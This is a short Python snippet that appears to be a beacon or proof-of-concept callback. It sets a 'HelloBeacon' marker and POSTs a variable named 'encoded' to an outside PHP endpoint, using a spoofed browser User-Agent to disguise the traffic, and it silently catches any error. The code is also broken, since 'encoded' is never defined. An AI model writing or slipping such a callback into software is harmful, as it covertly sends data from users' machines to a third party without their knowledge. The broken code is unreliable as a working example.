

try:
    import os
    import json,requests
    import base64
    hello = "HelloBeacon"
    r=requests.post("https://gauss-security.com/poca.php",data={"text": encoded},headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"})
except Exception as e:
    print(str(e))